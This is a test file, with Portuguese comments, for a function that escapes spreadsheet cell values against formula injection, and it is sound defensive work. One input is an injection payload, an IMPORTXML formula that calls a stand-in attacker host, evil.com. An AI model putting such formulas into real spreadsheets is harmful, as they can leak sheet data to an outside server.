import { describe, expect, it, vi } from "vitest";

// `server-only` lança ao ser importado fora do runtime de Server Component;
// no vitest ele vira um módulo vazio.
vi.mock("server-only", () => ({}));

import { escapeSheetValue } from "@/lib/sheets";

describe("escapeSheetValue", () => {
  it("neutraliza fórmula iniciada por '='", () => {
    expect(escapeSheetValue('=IMPORTXML("http://evil.com","//x")')).toBe(
      '\'=IMPORTXML("http://evil.com","//x")',
    );
    expect(escapeSheetValue("=1+1")).toBe("'=1+1");
  });

  it("neutraliza os demais gatilhos de fórmula do Sheets", () => {
    expect(escapeSheetValue("+55 31 98362-6852")).toBe("'+55 31 98362-6852");
    expect(escapeSheetValue("-x")).toBe("'-x");
    expect(escapeSheetValue("@user")).toBe("'@user");
  });

  it("neutraliza TAB e CR no começo, achatando o espaço em branco", () => {
    expect(escapeSheetValue("\t=1+1")).toBe("'=1+1");
    expect(escapeSheetValue("\rSUM(A1)")).toBe("'SUM(A1)");
  });

  it("enxerga o gatilho mesmo com espaços antes", () => {
    expect(escapeSheetValue("   =1+1")).toBe("'=1+1");
    expect(escapeSheetValue("  @todos")).toBe("'@todos");
  });

  it("deixa texto normal intacto", () => {
    expect(escapeSheetValue("Maria da Silva")).toBe("Maria da Silva");
    expect(escapeSheetValue("(31) 98362-6852")).toBe("(31) 98362-6852");
    expect(escapeSheetValue("Belo Horizonte")).toBe("Belo Horizonte");
    expect(escapeSheetValue("")).toBe("");
  });

  it("não confunde sinal no meio do texto com fórmula", () => {
    expect(escapeSheetValue("Ana Maria - Contagem")).toBe(
      "Ana Maria - Contagem",
    );
  });

  it("achata quebras de linha em espaço único", () => {
    expect(escapeSheetValue("Ana\nMaria")).toBe("Ana Maria");
    expect(escapeSheetValue("Ana\r\n\r\nMaria")).toBe("Ana Maria");
    expect(escapeSheetValue("Ana\t\tMaria")).toBe("Ana Maria");
  });

  it("corta em 500 caracteres", () => {
    expect(escapeSheetValue("a".repeat(600))).toBe("a".repeat(500));
    expect(escapeSheetValue("a".repeat(600))).toHaveLength(500);
  });

  it("mantém o corte em 500 mesmo com o apóstrofo de escape", () => {
    const escaped = escapeSheetValue(`=${"a".repeat(600)}`);
    expect(escaped.startsWith("'=")).toBe(true);
    expect(escaped).toHaveLength(500);
  });
});
